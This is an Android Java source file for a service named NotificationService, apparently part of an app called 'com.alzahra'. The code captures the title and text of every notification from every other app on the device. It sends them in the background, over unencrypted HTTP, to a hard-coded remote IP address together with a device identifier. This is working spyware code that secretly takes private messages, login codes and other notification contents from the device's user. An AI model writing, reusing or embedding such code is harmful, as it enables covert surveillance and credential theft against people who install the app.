package com.alzahra.service;

import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "AlZahraNotif";
    private static final String SERVER = "http://216.128.156.226:8443";
    private String deviceId = "UNKNOWN";

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            deviceId = getSharedPreferences("alzahra_prefs", MODE_PRIVATE)
                .getString("device_id", "UNKNOWN");
        } catch (Exception e) {
            Log.e(TAG, "Init error", e);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            if (pkg.equals("com.alzahra")) return;
            
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String bigText = extras.getString("android.bigText", "");
            String subText = extras.getString("android.subText", "");
            
            JSONObject obj = new JSONObject();
            obj.put("package", pkg);
            obj.put("title", title);
            obj.put("text", text.isEmpty() ? bigText : text);
            obj.put("sub_text", subText);
            obj.put("time", sbn.getPostTime());
            obj.put("key", sbn.getKey());
            
            sendToServer("notification", obj.toString());
        } catch (Exception e) {
            Log.e(TAG, "Notif error", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
    }

    private void sendToServer(String type, String content) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", type);
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
